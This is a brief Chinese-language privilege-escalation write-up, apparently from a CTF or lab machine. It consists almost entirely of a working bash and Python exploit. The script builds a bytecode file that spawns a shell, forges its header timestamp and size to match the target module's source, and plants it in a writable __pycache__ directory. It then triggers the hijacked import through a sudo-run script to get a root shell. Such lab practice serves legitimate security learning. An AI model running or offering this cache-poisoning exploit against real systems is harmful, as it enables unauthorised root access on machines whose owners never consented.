`__pycache__` 目录可写，还好我之前做了一下Fromytoy，一模一样的

```bash
# 1. 编写恶意代码
cat > /tmp/evil.py << 'EOF'
import os
import pty
pty.spawn('/bin/bash')
EOF

# 2. 编译生成 Python 3.9 的字节码文件
python3 -m py_compile /tmp/evil.py
cp /tmp/__pycache__/evil.cpython-39.pyc /tmp/evil.pyc

# 3. 准备修补脚本，将恶意 pyc 的头部时间戳和大小改为目标源文件的实际值
cat > /tmp/patch_pyc.py << 'PY'
import os
import struct

# 目标源文件（用于获取时间戳和大小）
target_py = "/opt/maze_admin/libs/report_formatter.py"
# 输入的恶意 pyc
in_pyc    = "/tmp/evil.pyc"
# 输出的目标 pyc 路径（模块缓存目录）
out_pyc   = "/opt/maze_admin/libs/__pycache__/report_formatter.cpython-39.pyc"

# 获取源文件的元数据
st = os.stat(target_py)
mtime = int(st.st_mtime)
size  = st.st_size

# 读取恶意字节码
with open(in_pyc, "rb") as f:
    data = bytearray(f.read())

# 修正 pyc 头部：偏移 8-11 字节为修改时间，12-15 字节为源文件大小
data[8:12]  = struct.pack("<I", mtime)
data[12:16] = struct.pack("<I", size)

# 替换目标 pyc 文件
try:
    if os.path.exists(out_pyc):
        os.remove(out_pyc)
        print(f"[*] Removed existing {out_pyc}")
    
    with open(out_pyc, "wb") as f:
        f.write(data)
    print(f"[+] Success! Wrote patched pyc to {out_pyc}")
except Exception as e:
    print(f"[-] Failed: {e}")
PY

# 4. 执行修补脚本
python3 /tmp/patch_pyc.py

# 5. 通过 sudo 运行目标脚本，触发恶意模块导入
sudo /usr/bin/python3 /opt/maze_admin/generate_report.py
```
